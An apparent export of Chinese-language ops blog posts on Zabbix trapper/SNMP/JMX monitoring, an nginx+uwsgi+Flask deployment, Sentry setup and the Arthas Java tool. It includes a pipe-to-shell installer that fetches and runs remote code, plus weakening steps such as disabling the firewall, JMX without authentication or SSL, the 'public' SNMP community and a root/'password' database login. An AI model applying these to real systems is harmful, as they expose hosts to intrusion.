Trapper（可以称为zabbix捕捉器），在zabbix服务器上必须有一个捕捉项目，然后需要配合zabbix_sender把数据推送给zabbix服务器，该程序由zabbix发行版本自带，源码包解压后在bin目录下，配合crontab定期发送数据给zabbix server。 ​ zabbix_sender是一个命令行工具，可以用来发送zabbix服务器处理性能数据。该工具通常用于长时间运行的用户 脚本，用于定期发送可用性和性能数据。 2、zabbix_sender命令：​ rpm导入zabbix_sender安装源： 1rpm -ivh http://repo.zabbix.com/zabbix/3.5/rhel/7/x86_64/zabbix-release-3.5-1.el7.noarch.rpm ​ ​ 使用rpm安装，默认在/bin目录下： 123456789101112131415161718cd /binls./zabbix_sender​ usage:zabbix_sender [-Vhv] &#123;[-zpsl] -ko | [-zpl] -T -i &lt;file&gt; -r&#125; [-c&lt;file&gt;]​ 参数说明：​ -c --config&lt;file&gt; 配置文件绝对路径​ -z --zabbix-server&lt;server&gt; zabbix server的IP地址​ -p --port&lt;server port&gt; zabbix server 端口默认10051​ -s --host &lt;hostname&gt; 主机名，zabbix客户端zabbix.agentd.conf配置文件中定义的Hostname（不是服务器的hostname），不是客户端主机的IP地址​ -l -- source-address &lt;IP address&gt; 源IP​ -k --key &lt;key&gt; 监控项的key值​ -o --value&lt;key value&gt; key值​ -i --input-file&lt;input file&gt; 从文件里面读取hostname、key、value一行为一条数据，使用空格作为分隔符，如果主机名带空格，那么请使用双引号包起来​ -T --with-timestamps 一行一条数据，空格作为分隔符：&lt;hostname&gt; &lt;key&gt; &lt;timestamp&gt; &lt;value&gt;，配合 --input-file option，timestamp为unix时间戳​ -r --real-time 将数据实时提交给服务器​ -v --verbose 详细模式， -vv 更详细 3、监控项配置​ 创建监控项（Configuration –&gt; Template –&gt; Items –&gt; Create item 或Configuration –&gt; Host –&gt; Items –&gt; Create item） ​ （1）选择“配置”-“主机”-“新建主机”,添加zabbix-Trapper 客户端的用户名： ​ （2） 添加完主机后，添加监控项，选择刚添加的主机，点击“监控项”，然后点击“创建监控项”： ​ 添加监控信息，然后点击更新： ​ ​ （3）客户端使用zabbix_sender发送数据 ​ 客户端设备操作： 12 cd /bin./zabbix_sender -s 192.168.40.134 -z 192.168.40.129 -k trappertest11 -o test ​ -vv 可以显示具体信息，这里提示无法连接到zabbix server的10051端口 ​ 服务端： 1netstat -anop | grep -i zabbix ​ 未开放外网的10051端口 12345ListenIP=127.0.0.1,192.168.40.134LIstenPort=10051systemctl restart zabbix-servicenetstat -anop | grep -i zabbix ​ 客户端： ​ Zabbix SNMP监控方式1、SNMP监控介绍​ 如果要监控打印机、路由器、交换机、UPS等设备，肯定不能使用zabbix agentd，因为他们不能安装软件，但是一般都支持SNMP协议，可以使用SNMP来监控。SNMP检查基于UDP协议。 ​ 注意事项：如果监控基于SNMPv3协议的设备，确保msgAuthoritativeEngineID（通常叫做snmpEngineID或“Engine ID”）是唯一的。 ​ 以前SNMPv3协议只支持MD5和DES加密，从zabbix2.2开始支持SHA与AES加密协议。 2、Zabbix SNMP监控Linux操作系统​ （1）zabbix服务器端需要先安装SNMP服务 ​ 使用yum源在线安装SNMP服务配置 1yum -y install net-snmp* ​ (2) 配置SNMP配置文件 12345678910vim /etc/snmp/snmpd.confproc mountd proc ntalkd 4proc sendmail 10 1disk / 10000load 12 14 14view systemview included .1.3.6.1.2.1.1view systemview included .1.3.6.1.2.1.25.1.1view systemview included .1 ​ (3) 设置开机启动SNMP： 123chkconfig snmpd onchkconfig --list | grep snmpd/etc/init.d/snmpd start 启动snmp服务 ​ （4）zabbix服务器使用snmpwalk命令测试被监控计算机名 ​ 2c是指采用SNMP V2版本，192.168.40.134是指监控设备开启了SNMP服务，否则会获取失败，sysName是指被监控设备的计算机名。 1snmpwalk -v 2c -c public 192.168.40.134 sysName ​ （5）被监控设备安装SNMP服务 1yum -y install net-snmp* ​ ​ (6) 配置SNMP配置文件 123view systemview included .1.3.6.1.2.1.1view systemview included .1.3.6.1.2.1.25.1.1view systemview included .1 ​ com2sec notConfigUser default zabbix #zabbix是被监控的团体名 public团体名称可以修改成自己设置的字符串也可以使用默认public，default字符串默认是所有IP地址都可以访问，如果把default修改成192.168.40.134（zabbix服务器IP地址），表示只允许zabbix服务器访问这台被监控电脑的SNMP服务。 1234systemctl enable snmpedsystemctl stop firewalld 关闭防火墙/etc/init.d/snmpd start 启动SNMP服务 systemctl stop firewalld 关闭防火墙 ​ /etc/init.d/snmpd start 启动SNMP服务 （7）zabbix服务端web界面添加主机 ​ 选择“配置”-“主机”-“创建主机”，添加要被监控设备的主机信息： ​ 添加模块： ​ 添加宏： 3、zabbix SNMP监控windows系统​ （1）windows系统启动SNMP功能： ​ 选择“控制面板”-“程序”-“启用或关闭windows功能”，选择“简单网络管理协议（SNMP）” ​ ​ （2）右击“计算机”-“管理”-“服务”，选择“snmp server”服务器，右击“属性”： ​ ​ （3）zabbix 服务端web界面，选择“配置”-“主机”，然后点击“创建主机” ​ ​ ​ 大概需要等待五分钟左右，查看主机监控成功。 4、zabbix SNMP 监控网设备​ “配置”-“主机”-“创建主机”，添写要监控的设备信息： ​ ​ zabbix JMX监控方式1、zabbix JMX 简介​ 在企业中，很多程序是基于Java来编写的，java程序运行在JVM之上，而JVM自己就可以监听在某个套接字上，将自己内部的状态信息输出出去，所以监控服务器只需要直接连接JVM的套接字就可以获取到Java进程的相关信息，不需要通过Agent、SNMP；可是zabbix是没办法自己连接JVM套接字的，也就是说，zabbix自身是不能够作为客户端来链接该套接字的。所以，就需要额外安装一个服务来连接JVM套接字的。这个服务就是zabbix-java-gateway.x86_64(Java网关）；可以通过该网关来监听多个JVM；zabbix-agent-gateway可以是一个单独的主机，可以和zabbix server安装到一台主机上； 2、zabbix server 安装java gateway​ zabbix提供了一个java gateway的应用去监控jmx（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。JMX可以跨越一系列异构操作平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服务管理应用。 1yum install -y java java-devel zabbix-java-gateway 3、添加java环境1234567891011vim /etc/profile​ JAVA_HOME=/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el7_5.x86_64​ PATH=$JAVA_HOME/bin:$PATH​ CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar​ export JAVA_HOME​ export PATH​ export CLASSPATH#加载环境：source /etc/profile 4、修改java-gateway配置文件123456789grep ^[a-Z] /etc/zabbix/zabbix_java_gateway.confcd /etc/zabbixvim zabbix_java_gateway.conf 修改以下信息：​ LISTEN_IP="0.0.0.0"​ LISTEN_PORT=10052​ PID_FILE="/var/run/zabbix/zabbix_java.pid"​ START_POLLERS=5​ TIMEOUT=3 5、重启java-gateway服务1systemctl restart zabbix-java-gateway 6、修改zabbix_server配置文件123456find / -name zabbix_java_gatewayvim /usr/sbin/zabbix_java_gateway 修改以下配置信息​ JavaGateway=192.168.40.131&lt;br&gt;​ JavaGatewayPort=10052&lt;br&gt;​ StartJavaPollers=5 7、重启zabbix_server服务1systemctl restart zabbix-server 8、客户端配置​ 在Tomcat下的/bin/catalina.sh文件中添加以下内容： 1CATALINA_OPTS="$CATALINA_OPTS -Djavax.management.builder.initial= -Dcom.sun.management.jmxremote=true -Dcom.sun.management.jmxremote.port=12345 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Djava.rmi.server.hostname=192.168.40.131" ​ 重启Tomcat进程： ​ 9、zabbix中添加监控​ 选择配置：主机-模板-选择-模板-： zabbix IPMI监控方式介绍​ IPMI（Intelligent PlatformManagement Interface）既智能平台管理接口是使硬件管理具备“智能化”的新一代通用接口标准。用户可以利用IPMI监视服务器的物理特性，如温度、电压、电扇工作状态、电源供应以及机箱入侵等。Ipmi最大的优势在于它是独立于 CPU BIOS 和OS的，所以用户无论在开机还是关机的状态下，只要接通电源就可以实现对服务器的监控。Ipmi是一种规范的标准，其中最重要的物理部件就是BMC（Baseboard Management Controller），一种嵌入式管理微控制器，它相当于整个平台管理的“大脑”，通过它 ipmi 可以监控各个传感器的数据并记录各种事件的日志。 条件​ 使用 ipmi 的先决条件，想要实现对服务器的 ipmi 管理，必须在硬件、OS、管理工具等几个方面都满足： ​ a.服务器硬件本身提供对 ipmi 的支持目前惠普、戴尔和 NEC 等大多数厂商的服务器都支持IPMI 1.5，但并不是所有服务器都支持，所以应该先通过产品手册或在 BIOS 中确定服务器是否支持 ipmi，也就是说服务器在主板上要具有 BMC 等嵌入式的管理微控制器。 ​ b.操作系统提供相应的 ipmi 驱动通过操作系统监控服务器自身的 ipmi 信息时需要系统内核提供相应的支持，linux 系统通过内核对OpenIPMI（ipmi 驱动）的支持来提供对 ipmi 的系统接口。 实例日常监控中使用IPMI的方式不多，在此不举例说明了。]]></content>
      <categories>
        <category>应用运维</category>
        <category>监控积累</category>
      </categories>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx+uwsgi+flask搭建web服务]]></title>
    <url>%2Farticles%2Fe67f5ae2.html</url>
    <content type="text"><![CDATA[1，目的在生产环境下，可以通过Nginx+uwsgi+Flask部署Web服务，从而达到高并发高稳定性的要求。 如果要部署多个APP，可以采用单个Nginx，多个uwsgi+Flask的方式来实现，如下图所示。 2，安装过程2.1，升级软件包1sudo apt-get update 2.2，安装virtualenv和python环境12sudo apt-get install build-essential python-dev python-pip sudo pip install virtualenv 2.3，在virtualenv中部署flask app，并测试 创建存放网站的目录 1mkdir mysite 配置virtualenv和安装flask 进入mysite目录，然后创建虚拟环境.env，激活虚拟环境，然后安装flask 1234cd mysite virtualenv .env # 创建Python虚拟环境 source .env/bin/activate # 进入Python虚拟环境，退出命令是deactivate pip install flask # 在虚拟环境下安装flask 在mysite目录下创建hello.py 12345678910111213from flask import Flaskapp = Flask(__name__)@app.route(&quot;/app1/&quot;)def hello(): return &quot;Hello World!&quot;@app.route(&quot;/app1/flask/&quot;)def hello_flask(): return &quot;Hello World! Hello Flask!&quot;if __name__ == &quot;__main__&quot;: app.run(host=&apos;0.0.0.0&apos;, port=8080) 需要注意的是，app.run()只是开发时测试使用，故需要放置在if __name__ == &quot;__main__&quot;下，这样uwsgi才不会执行app.run()方法。而host需要设置为0.0.0.0，表示让flask监听机器的所有ip地址的8080端口。 启动测试 执行以下命令，可以启动Flask。通过浏览器访问192.168.1.32:8080/app1/，如果返回“Hello World!”，则证明启动OK。 1python hello.py 2.4，在virtualenv中部署uwsgi，并测试 进入到Python虚拟环境，并安装uwsgi 1234567891011source .env/bin/activate # 进入Python虚拟环境，退出命令是deactivate pip install uwsgi # 在虚拟环境下安装uwsgi#uwsgi的启动可以把参数加载命令行中，也可以是配置文件 .ini, .xml, .yaml 配置文件中，个人用的比较多得是 .ini 文件。#通过uwsgi --help可以查看得到：-x|--xmlconfig load config from xml file-x|--xml load config from xml file--ini load config from ini file-y|--yaml load config from yaml file-y|--yml load config from yaml file 创建uwsgi目录，做好目录规划如下 12345678910(.env) kevin@orange:~/web/flask/mysite$ tree ..├── hello.py├── hello.pyc├── uwsgi│ ├── uwsgi.log│ ├── uwsgi.pid│ ├── uwsgi.sock│ └── uwsgi.status└── uwsgi.ini 修改uwsgi配置文件 123456789101112131415161718192021(.env) kevin@orange:~/web/flask/mysite$ vi uwsgi.ini [uwsgi]chdir=/home/kevin/web/flask/mysite/home=/home/kevin/web/flask/mysite/.envmodule=hellocallable=appmaster=trueprocesses=2chmod-socket=666logfile-chmod=644uid=kevin_webgid=kevin_webprocname-prefix-spaced=mysitepy-autoreload=1#http=0.0.0.0:8080vacuum=truesocket=%(chdir)/uwsgi/uwsgi.sockstats=%(chdir)/uwsgi/uwsgi.statuspidfile=%(chdir)/uwsgi/uwsgi.piddaemonize=%(chdir)/uwsgi/uwsgi.log 配置参数的含义，可参考http://www.jianshu.com/p/c3b13b5ad3d7 常用命令 123uwsgi --ini uwsgi.ini # 启动uwsgi --reload uwsgi.pid # 重启uwsgi --stop uwsgi.pid # 关闭 启动uwsgi（在虚拟环境下），并测试 1234567(.env) kevin@orange:~/web/flask/mysite$ uwsgi --ini uwsgi.ini[uWSGI] getting INI configuration from uwsgi.ini(.env) kevin@orange:~/web/flask/mysite$ ps -ef | grep mysitezhangsh+ 2270 1 0 16:15 ? 00:00:00 mysite uWSGI masterzhangsh+ 2273 2270 0 16:15 ? 00:00:00 mysite uWSGI worker 1zhangsh+ 2274 2270 0 16:15 ? 00:00:00 mysite uWSGI worker 2zhangsh+ 2278 2171 0 16:15 pts/1 00:00:00 grep --color=auto mysite 2.5，安装nginx，并配置测试 安装nginx（不在python虚拟环境下） 1sudo apt-get install nginx 编辑配置文件：/etc/nginx/conf.d/flask.conf 12345678910111213141516server &#123; listen 81; server_name www.mysite.com; charset utf-8; client_max_body_size 5M; location /app1/ &#123; include uwsgi_params; uwsgi_pass unix:/home/kevin/web/flask/mysite/uwsgi/uwsgi.sock; &#125; location /static &#123; alias /home/kevin/web/flask/mysite/static; &#125;&#125; nginx启动测试 12345678kevin@orange:~/web/flask/mysite$ sudo service nginx startkevin@orange:~/web/flask/mysite$ ps -ef | grep nginxroot 2324 1 0 16:19 ? 00:00:00 nginx: master process /usr/sbin/nginxwww-data 2325 2324 0 16:19 ? 00:00:00 nginx: worker processwww-data 2326 2324 0 16:19 ? 00:00:00 nginx: worker processwww-data 2327 2324 0 16:19 ? 00:00:00 nginx: worker processwww-data 2328 2324 0 16:19 ? 00:00:00 nginx: worker processzhangsh+ 2330 2171 0 16:20 pts/1 00:00:00 grep --color=auto nginx 2.6，服务测试 Http访问测试，一切OK 1234kevin@Blue:~$ curl http://192.168.1.32:81/app1/flask/Hello World! Hello Flask!kevin@Blue:~$ curl http://192.168.1.32:81/app1/Hello World! 浏览器访问测试，一切OK 3，服务监控 读取uwsgi实时状态 1uwsgi --connect-and-read uwsgi/uwsgi.status 读取的结果是个json串，包括每个总的状态，每个work是状态，响应时间等，非常全面，也有一些开源的监控可以使用 实时动态查看状态 - uwsgitop 这里有个uwsgi官方制作的实用工具 uwsgitop, 下面看下效果。 12345678910111213# pip install uwsgitop# uwsgitop uwsgi/uwsgi.statusuwsgi-2.0.9 - Mon Sep 14 11:20:44 2015 - req: 0 - RPS: 0 - lq: 0 - tx: 0node: lzz-rmbp - cwd: /Users/liuzhizhi/erya/portal - uid: 501 - gid: 20 - masterpid: 12748 WID % PID REQ RPS EXC SIG STATUS AVG RSS VSZ TX RunT 1 0.0 12749 0 0 0 0 idle 0ms 0 0 0 0 2 0.0 12750 0 0 0 0 idle 0ms 0 0 0 0 3 0.0 12751 0 0 0 0 idle 0ms 0 0 0 0 4 0.0 12752 0 0 0 0 idle 0ms 0 0 0 0 5 0.0 12753 0 0 0 0 idle 0ms 0 0 0 0 6 0.0 12754 0 0 0 0 idle 0ms 0 0 0 0 7 0.0 12755 0 0 0 0 idle 0ms 0 0 0 0 8 0.0 12756 0 0 0 0 idle 0ms 0 0 0 0 4，参考资料 如何理解Nginx, WSGI, Flask之间的关系http://blog.csdn.net/lihao21/article/details/52304119 uWSGI的安装与配置http://blog.csdn.net/chenggong2dm/article/details/43937433 uWSGI实战之操作经验http://blog.csdn.net/orangleliu/article/details/48437319 nginx配置参考http://wiki.nginx.org/HttpUwsgiModule#uwsgi_param uwsgi安装参考http://uwsgi-docs.readthedocs.io/en/latest/WSGIquickstart.html uwsgi配置参考http://uwsgi-docs.readthedocs.io/en/latest/Options.html#vacuum Nginx+uWSGIhttps://my.oschina.net/guol/blog/121418]]></content>
      <categories>
        <category>应用运维</category>
        <category>服务搭建</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>Uwsgi</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[业务监控工具Sentry的搭建与使用]]></title>
    <url>%2Farticles%2F9bd04711.html</url>
    <content type="text"><![CDATA[官方网址参考Django Sentry 官网 Sentry 简介Sentry 是一个开源的实时错误报告工具，支持 web 前后端、移动应用以及游戏，支持 Python、OC、Java、Go、Node、Django、RoR 等主流编程语言和框架 ，还提供了 GitHub、Slack、Trello 等常见开发工具的集成。Sentry 服务支持多用户、多团队、多应用管理，每个应用都对应一个 PROJECT_ID，以及用于身份认证的 PUBLIC_KEY 和 SECRET_KEY。由此组成一个这样的 DSN： 1&#123;PROTOCOL&#125;://&#123;PUBLIC_KEY&#125;:&#123;SECRET_KEY&#125;@&#123;HOST&#125;/&#123;PATH&#125;&#123;PROJECT_ID&#125; PROTOCOL 通常会是 http 或者 https，HOST 为 Sentry 服务的主机名和端口，PATH 通常为空。 环境依赖 Redis 搭建 / RabbitMQ 的搭建 MySQL / PostgreSQL Python 虚拟环境 安装教程 Redis 的安装参考文档：https://linux.cn/article-6719-1.htmlhttp://www.jianshu.com/p/aec247ffbe51 MySQL 的安装 略 Python 虚拟环境的安装因为 Sentry 依赖的 Python 库比较多，为了避免对系统环境的污染，与现有的Python有冲突，建议还是将 Sentry 安装在虚拟环境中。 1234567891011A. Python 库文件： python-setuptools, python-dev, build-essential, python-pipB. 安装虚拟环境： pip install virtualenv 安装完成后，可以直接 virtualenv xxx 即可在当前目录下生成一个虚拟环境xxx目录，进入到目录中，source bin/activate 即可激活当前虚拟环境。C. 选择安装 virtualenvwrapper： pip install virtualenvwrapper 安装完成后，建立个虚拟环境安装存储的目录，建议是 $HOME/.virtualenv 目录，配置下 .bashrc 文件，文件末尾添加： export WORKON_HOME=$HOME/.virtualenvs source /usr/local/bin/virtualenvwrapper.shsource .bashrc后，运行 mkvirtualenv xxx 即可建立虚拟环境。退出运行 deactivate。这样，就不需要再进入到虚拟环境目录运行 source xxx/activate，直接在终端输入 workon xxx 即可。 Sentry在虚拟环境下，直接运行 pip install sentry 即可。 这样，安装基本上就结束了。接下来需要配置下 sentry。 配置 Sentry运行 sentry init, 会在 $HOME 下生成 .sentry 目录。进入 .sentry 后，需要修改数据库配置(当然，你也可以不改，直接使用 PostgreSQL)： 12345678910DATABASES = &#123; &apos;default&apos;: &#123; &apos;ENGINE&apos;: &apos;django.db.backends.mysql&apos;, # 这里换成了 MySQL，默认是 pq &apos;NAME&apos;: &apos;xxx&apos;, &apos;USER&apos;: &apos;xxx&apos;, &apos;PASSWORD&apos;: &apos;xxx&apos;, &apos;HOST&apos;: &apos;xxx&apos;, &apos;PORT&apos;: &apos;xxx&apos;, &#125;&#125; 端口和队列等可以自行指定。这里，我指定的是15000。下面是一个配置参考： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154# This file is just Python, with a touch of Django which means# you can inherit and tweak settings to your hearts content.from sentry.conf.server import *import os.pathCONF_ROOT = os.path.dirname(__file__)DATABASES = &#123; &apos;default&apos;: &#123; &apos;ENGINE&apos;: &apos;django.db.backends.mysql&apos;, &apos;NAME&apos;: &apos;django_sentry&apos;, &apos;USER&apos;: &apos;root&apos;, &apos;PASSWORD&apos;: &apos;password&apos;, &apos;HOST&apos;: &apos;localhost&apos;, &apos;PORT&apos;: &apos;3306&apos;, &apos;AUTOCOMMIT&apos;: True, &apos;ATOMIC_REQUESTS&apos;: False, &#125;&#125;# You should not change this setting after your database has been created# unless you have altered all schemas firstSENTRY_USE_BIG_INTS = True# If you&apos;re expecting any kind of real traffic on Sentry, we highly recommend# configuring the CACHES and Redis settings############ General ############# Instruct Sentry that this install intends to be run by a single organization# and thus various UI optimizations should be enabled.SENTRY_SINGLE_ORGANIZATION = TrueDEBUG = False########## Cache ########### Sentry currently utilizes two separate mechanisms. While CACHES is not a# requirement, it will optimize several high throughput patterns.# If you wish to use memcached, install the dependencies and adjust the config# as shown:## pip install python-memcached## CACHES = &#123;# &apos;default&apos;: &#123;# &apos;BACKEND&apos;: &apos;django.core.cache.backends.memcached.MemcachedCache&apos;,# &apos;LOCATION&apos;: [&apos;127.0.0.1:11211&apos;],# &#125;# &#125;# A primary cache is required for things such as processing eventsSENTRY_CACHE = &apos;sentry.cache.redis.RedisCache&apos;########## Queue ########### See https://docs.sentry.io/on-premise/server/queue/ for more# information on configuring your queue broker and workers. Sentry relies# on a Python framework called Celery to manage queues.CELERY_ALWAYS_EAGER = FalseBROKER_URL = &apos;redis://127.0.0.1:6379&apos;################ Rate Limits ################# Rate limits apply to notification handlers and are enforced per-project# automatically.SENTRY_RATELIMITER = &apos;sentry.ratelimits.redis.RedisRateLimiter&apos;################### Update Buffers #################### Buffers (combined with queueing) act as an intermediate layer between the# database and the storage API. They will greatly improve efficiency on large# numbers of the same events being sent to the API in a short amount of time.# (read: if you send any kind of real data to Sentry, you should enable buffers)SENTRY_BUFFER = &apos;sentry.buffer.redis.RedisBuffer&apos;########### Quotas ############ Quotas allow you to rate limit individual projects or the Sentry install as# a whole.SENTRY_QUOTAS = &apos;sentry.quotas.redis.RedisQuota&apos;######### TSDB ########## The TSDB is used for building charts as well as making things like per-rate# alerts possible.SENTRY_TSDB = &apos;sentry.tsdb.redis.RedisTSDB&apos;############ Digests ############# The digest backend powers notification summaries.SENTRY_DIGESTS = &apos;sentry.digests.backends.redis.RedisBackend&apos;################# File storage ################## Any Django storage backend is compatible with Sentry. For more solutions see# the django-storages package: https://django-storages.readthedocs.org/en/latest/SENTRY_FILESTORE = &apos;django.core.files.storage.FileSystemStorage&apos;SENTRY_FILESTORE_OPTIONS = &#123; &apos;location&apos;: &apos;/tmp/sentry-files&apos;,&#125;############### Web Server ################ If you&apos;re using a reverse SSL proxy, you should enable the X-Forwarded-Proto# header and uncomment the following settings# SECURE_PROXY_SSL_HEADER = (&apos;HTTP_X_FORWARDED_PROTO&apos;, &apos;https&apos;)# SESSION_COOKIE_SECURE = True# CSRF_COOKIE_SECURE = True# If you&apos;re not hosting at the root of your web server,# you need to uncomment and set it to the path where Sentry is hosted.# FORCE_SCRIPT_NAME = &apos;/sentry&apos;SENTRY_WEB_HOST = &apos;0.0.0.0&apos;SENTRY_WEB_PORT = 5000SENTRY_WEB_OPTIONS = &#123; # &apos;workers&apos;: 3, # the number of web workers # &apos;protocol&apos;: &apos;uwsgi&apos;, # Enable uwsgi protocol instead of http&#125;LANGUAGES = ( (&apos;en&apos;, gettext_noop(&apos;English&apos;)), (&apos;zh-cn&apos;, gettext_noop(&apos;Simplified Chinese&apos;)), # (&apos;zh-cn&apos;, gettext_noop(&apos;Traditional Chinese&apos;)),) 运行 Sentry 初始化: 1sentry upgrade 注意，这里可能会出现错误，可以参考下面遇到的坑。初始化的时候，需要设置一个 superuser 角色，直接按提示操作即可。 启动 web 进程: 1sentry run web 启动 worker 进程: 1sentry run worker 这时候，通过 IP:PORT 的形式访问下，填写刚才填写的用户名和密码即可登录。登录后，我们创建一个 project。我这里设置的是 Odeon_Dev，接下来选择项目，我选择的是 Django。这个时候，会弹出一个在项目中配置的教程。我们按照提示操作即可。 测试环境的地址： 1http://localhost:5000/sentry/odeon_dev/ 项目中配置 Sentry按照上面的操作，Sentry 服务就可以 run 起来了。接下来需要在 Odeon 的项目中配置下 Sentry 环境即可。这里，我们需要引入一个新包: raven。我安装的 是 raven 6.1.0 1234567891011121314安装： A. 可以直接下载 raven 包，将其导入到环境中; B. 直接指令安装: build/env/bin/pip install raven==6.1.0项目配置： 直接将 sentry 创建 project 时返回的信息放入 settings 文件中即可 import os import raven RAVEN_CONFIG = &#123; &apos;dsn&apos;: &apos;http://fxxx:xxx@localhost:xxx/2&apos;, &apos;release&apos;: raven.fetch_git_sha(os.path.dirname(os.pardir)), &#125; 至此，整个 Sentry 的搭建和项目中需要的配置就完全 OK 了。当然，也可以更完善一下，比如： 利用 Nginx 反向代理使用域名访问服务； 利用 supervisor 来起 Sentry 服务等。 接下来，就是按需使用了。 遇到的坑 sentry默认使用 PostgreSQL。我用的是 mysql。运行 sentry upgrade 的时候，发现运行到 db migration 的时候抛了异常，查阅发现是 db engine 使用的是MyISAM，不支持 transaction 导致的。这里需要注意下，我将 engine 指定为 InnoDB后，执行 migration 的时候错误消失。 页面打开后，提示 worker 没有正常运行。发现没有启动 worker。我们手动启动下 worker，启动时，需要在系统中将 C_FORCE_ROOT 设置为 true。详细点击： 参考链接 参考链接： https://yunsonbai.top/2016/05/30/django-sentry/ https://tech.liuchao.me/2015/06/monitor-service-error-logs-by-using-sentry/]]></content>
      <categories>
        <category>应用运维</category>
        <category>服务搭建</category>
      </categories>
      <tags>
        <tag>Sentry</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里Java神级诊断工具arthas]]></title>
    <url>%2Farticles%2F9655b613.html</url>
    <content type="text"><![CDATA[介绍在阿里巴巴内部，有很多自研工具供开发者使用，其中有一款工具，是几乎每个Java开发都使用过的工具，那就是Arthas，这是一款Java诊断工具，是一款牛逼带闪电的工具。该工具已于2018年9月份开源。 GitHub 地址 用户文档 在日常开发中，你是否遇到过以下问题： 这个类从哪个 jar 包加载的？为什么会报各种类相关的 Exception？ 我改的代码为什么没有执行到？难道是我没 commit？分支搞错了？ 遇到问题无法在线上 debug，难道只能通过加日志再重新发布吗？ 线上遇到某个用户的数据处理有问题，但线上同样无法 debug，线下无法重现！ 是否有一个全局视角来查看系统的运行状况？ 有什么办法可以监控到JVM的实时运行状态？ 以上问题，通通可以通过Arthas来进行问题诊断！！！是不是很好很强大。 Arthas 安装使用脚本一键安装Arthas 支持在 Linux/Unix/Mac 等平台上一键安装，请复制以下内容，并粘贴到命令行中，敲 回车 执行即可： 1curl -L https://alibaba.github.io/arthas/install.sh | sh 上述命令会下载启动脚本文件 as.sh 到当前目录，你可以放在任何地方或将其加入到 $PATH 中。 直接在shell下面执行./as.sh，就会进入交互界面。 也可以执行./as.sh -h来获取更多参数信息。 如果从github下载有问题，可以使用gitee镜像 1curl -L https://arthas.gitee.io/install.sh | sh 使用arthas-boot 安装(推荐)下载arthas-boot.jar，然后用java -jar的方式启动： 12wget https://alibaba.github.io/arthas/arthas-boot.jarjava -jar arthas-boot.jar 打印帮助信息： 1java -jar arthas-boot.jar -h 如果下载速度比较慢，可以使用aliyun的镜像： 1java -jar arthas-boot.jar --repo-mirror aliyun --use-http ​ 如果从github下载有问题，可以使用gitee镜像 1wget https://arthas.gitee.io/arthas-boot.jar 启动Arthas在命令行下面执行（使用和目标进程一致的用户启动，否则可能attach失败）： 1java -jar arthas-boot.jar 执行该程序的用户需要和目标进程具有相同的权限。比如以admin用户来执行：sudo su admin &amp;&amp; java -jar arthas-boot.jar 或 sudo -u admin -EH java -jar arthas-boot.jar。 如果attach不上目标进程，可以查看~/logs/arthas/ 目录下的日志。 如果下载速度比较慢，可以使用aliyun的镜像：java -jar arthas-boot.jar --repo-mirror aliyun --use-http java -jar arthas-boot.jar -h 打印更多参数信息。 1java -jar arthas-boot.jar 启动成功会列出java进程，随便选择一个后回车或直接回车。 操作命令基础命令 help——查看命令帮助信息 cat——打印文件内容，和linux里的cat命令类似 pwd——返回当前的工作目录，和linux命令类似 cls——清空当前屏幕区域 session——查看当前会话的信息 reset——重置增强类，将被 Arthas 增强过的类全部还原，Arthas 服务端关闭时会重置所有增强过的类 version——输出当前目标 Java 进程所加载的 Arthas 版本号 history——打印命令历史 quit——退出当前 Arthas 客户端，其他 Arthas 客户端不受影响 shutdown——关闭 Arthas 服务端，所有 Arthas 客户端全部退出 keymap——Arthas快捷键列表及自定义快捷键 jvm相关 dashboard——当前系统的实时数据面板 thread——查看当前 JVM 的线程堆栈信息 jvm——查看当前 JVM 的信息 sysprop——查看和修改JVM的系统属性 sysenv——查看JVM的环境变量 getstatic——查看类的静态属性 New! ognl——执行ognl表达式 New! mbean——查看 Mbean 的信息 class/classloader相关 sc——查看JVM已加载的类信息 sm——查看已加载类的方法信息 jad——反编译指定已加载类的源码 mc——内存编绎器，内存编绎.java文件为.class文件 redefine——加载外部的.class文件，redefine到JVM里 dump——dump 已加载类的 byte code 到特定目录 classloader——查看classloader的继承树，urls，类加载信息，使用classloader去getResource monitor/watch/trace相关 请注意，这些命令，都通过字节码增强技术来实现的，会在指定类的方法中插入一些切面来实现数据统计和观测，因此在线上、预发使用时，请尽量明确需要观测的类、方法以及条件，诊断结束要执行 shutdown 或将增强过的类执行 reset 命令。 monitor——方法执行监控 watch——方法执行数据观测 trace——方法内部调用路径，并输出方法路径上的每个节点上耗时 stack——输出当前方法被调用的调用路径 tt——方法执行数据的时空隧道，记录下指定方法每次调用的入参和返回信息，并能对这些不同的时间下调用进行观测 options options——查看或设置Arthas全局开关 管道Arthas支持使用管道对上述命令的结果进行进一步的处理，如sm java.lang.String * | grep &#39;index&#39; 后台异步任务当线上出现偶发的问题，比如需要watch某个条件，而这个条件一天可能才会出现一次时，异步后台任务就派上用场了，详情请参考这里 使用 &gt; 将结果重写向到日志文件，使用 &amp; 指定命令是后台运行，session断开不影响任务执行（生命周期默认为1天） jobs——列出所有job kill——强制终止任务 fg——将暂停的任务拉到前台执行 bg——将暂停的任务放到后台执行 Web Console通过websocket连接Arthas。 Web Console 主要命令详解Dashboard当前系统的实时数据面板，按 ctrl+c 退出。 当运行在Ali-tomcat时，会显示当前tomcat的实时信息，如HTTP请求的qps, rt, 错误数, 线程池信息等等 1dashboard 数据说明 ID: Java级别的线程ID，注意这个ID不能跟jstack中的nativeID一一对应 NAME: 线程名 GROUP: 线程组名 PRIORITY: 线程优先级, 1~10之间的数字，越大表示优先级越高 STATE: 线程的状态 CPU%: 线程消耗的cpu占比，采样100ms，将所有线程在这100ms内的cpu使用量求和，再算出每个线程的cpu使用占比。 TIME: 线程运行总时间，数据格式为分：秒 INTERRUPTED: 线程当前的中断位状态 DAEMON: 是否是daemon线程 